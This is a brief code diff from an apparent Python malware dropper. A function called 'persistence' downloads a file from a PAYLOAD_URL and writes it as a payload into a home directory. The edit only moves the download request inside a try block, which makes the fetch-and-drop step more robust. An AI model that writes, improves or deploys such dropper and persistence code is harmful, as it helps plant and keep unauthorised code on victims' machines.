@@ -25,9 +25,9 @@ def persistence(home, file_name):
         pass
 
 
-r = requests.get(PAYLOAD_URL, allow_redirects=True)
-
 try:
+    r = requests.get(PAYLOAD_URL, allow_redirects=True)
+
     if os.path.exists(MY_HOME):
         open(MY_HOME + PAYLOAD_NAME, "wb").write(r.content)
     else:
